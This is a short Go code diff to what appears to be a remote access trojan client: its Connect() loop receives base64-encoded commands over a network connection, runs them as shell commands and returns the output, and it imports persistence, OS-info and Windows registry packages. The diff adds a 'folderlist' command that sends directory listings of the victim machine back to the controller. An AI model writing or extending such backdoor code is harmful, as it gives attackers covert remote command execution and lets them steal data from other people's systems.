@@ -3,8 +3,10 @@ package work
 import (
 	"bufio"
 	"bytes"
+	"context"
 	"encoding/base64"
 	"fmt"
+	"github.com/phil-fly/generate/pool/folder"
 	"github.com/phil-fly/generate/pool/osinfo"
 	"github.com/phil-fly/generate/pool/persistence"
 	"golang.org/x/sys/windows/registry"
@@ -84,6 +86,10 @@ func Connect() {
 			fmt.Println(string(decodedCommand))
 			SendMessage(conn, EncodeBytesToString(RunCmdReturnByte(string(decodedCommand))))
 			//RemoveNewLineCharFromConnection(conn)
+		case "folderlist":
+			Folder := ReceiveMessageStdEncoding(conn)
+			Folder = string(DecodeToBytes(Folder))
+			SendMessage(conn, EncodeBytesToString(folder.GetFolderlist(Folder)))
 
 		case "back":
 			conn.Close()
@@ -181,6 +187,9 @@ func Connect() {
 		} // end switch
 	}
 }
+
+
+
 
 func DecodeToBytes(encData string) []byte {
 	decData, _ := base64.URLEncoding.DecodeString(encData)
